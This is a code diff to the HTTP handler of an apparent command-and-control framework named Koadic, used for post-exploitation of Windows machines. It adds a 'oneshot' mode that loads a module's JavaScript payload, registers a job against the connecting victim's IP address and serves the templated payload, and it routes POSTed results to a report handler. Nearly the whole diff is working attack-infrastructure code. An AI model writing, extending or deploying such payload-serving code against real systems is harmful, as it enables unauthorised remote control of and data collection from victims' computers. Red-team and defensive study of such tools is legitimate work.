@@ -127,18 +127,19 @@ class Handler(BaseHTTPRequestHandler):
 
             if not self.session:
                 return False
-
-            jobkey = self.options.get("JOBNAME")
-            if jobkey in self.get_params:
-                self.shell.print_verbose("self.params:  %s" % self.get_params)
-                if self.get_params[jobkey][0] != "stage":
-                    self.job = self.session.get_job(self.get_params[jobkey][0])
-
-                if self.job:
-                    self.options.set("JOBKEY", self.job.key)
-                    self.options.set("JOBPATH", "%s=%s;" % (jobkey, self.job.key))
-
             self.init_session(False)
+
+        jobkey = self.options.get("JOBNAME")
+        if jobkey in self.get_params:
+            self.shell.print_verbose("self.params:  %s" % self.get_params)
+            if self.get_params[jobkey][0] != "stage":
+                self.job = [job for job in self.shell.jobs if job.key == self.get_params[jobkey][0]][0]
+
+            if self.job:
+                self.shell.print_verbose("handler::parse_params() - fetched job_key = %s" % (self.job.key))
+                self.options.set("JOBKEY", self.job.key)
+                self.options.set("JOBPATH", "%s=%s;" % (jobkey, self.job.key))
+
         elif self.shell.continuesession:
             self.session = self.shell.continuesession
 
@@ -167,6 +168,9 @@ class Handler(BaseHTTPRequestHandler):
     # the initial stage is a GET request
     def do_GET(self):
         if self.parse_params():
+            if self.options.get("ONESHOT") == "true":
+                return self.handle_oneshot()
+
             if not self.session:
                 return self.handle_new_session()
 
@@ -182,6 +186,9 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.parse_params():
+            if self.options.get("ONESHOT") == "true":
+                return self.handle_report()
+
             if not self.session:
                 return self.reply(403)
 
@@ -216,6 +223,30 @@ class Handler(BaseHTTPRequestHandler):
         template = self.options.get("_FORKTEMPLATE_")
         data = self.post_process_script(self.options.get("_STAGE_"), template)
         self.reply(200, data)
+
+    def handle_oneshot(self):
+        plugin = self.shell.plugins[self.options.get("MODULE")]
+        options = copy.deepcopy(plugin.options)
+        workload = self.loader.load_script("data/"+self.options.get("MODULE")+".js", plugin.options)
+        j = plugin.job(self.shell, -1, self.shell.state, workload, options)
+        if j.create == False:
+            script = b"Koadic.exit();"
+            template = self.options.get("_STAGETEMPLATE_")
+            script = self.post_process_script(script, template)
+
+            self.reply(200, script)
+            return
+
+        j.ip = str(self.client_address[0])
+        self.shell.jobs.append(j)
+
+        self.shell.print_verbose("handler::handle_oneshot()")
+        self.options.set("JOBKEY", j.key)
+        script = j.payload()
+        template = self.options.get("_STAGETEMPLATE_")
+        script = self.post_process_script(script, template)
+
+        self.reply(200, script)
 
     def handle_new_session(self):
         self.shell.print_verbose("handler::handle_new_session()")
